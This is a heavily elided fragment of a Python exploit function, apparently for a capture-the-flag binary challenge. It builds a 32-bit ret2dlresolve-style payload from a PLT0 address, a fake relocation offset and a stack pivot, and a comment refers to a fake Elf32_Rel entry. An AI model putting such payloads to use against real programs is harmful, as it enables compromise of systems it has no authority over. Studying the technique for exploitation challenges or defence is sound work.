...
def pwn():
    ...
    payload1 = p32(plt0) + p32(fake_reltab_offset) + p32(pop3ret) + p32(stack_base + 0x90) #+ p32(stack_base+0x90) + p32(len(binsh)) 
    ...
    # payload1 += p32(writegot_addr+1) + p32(fake_symtab_offset) # fake Elf32_Rel
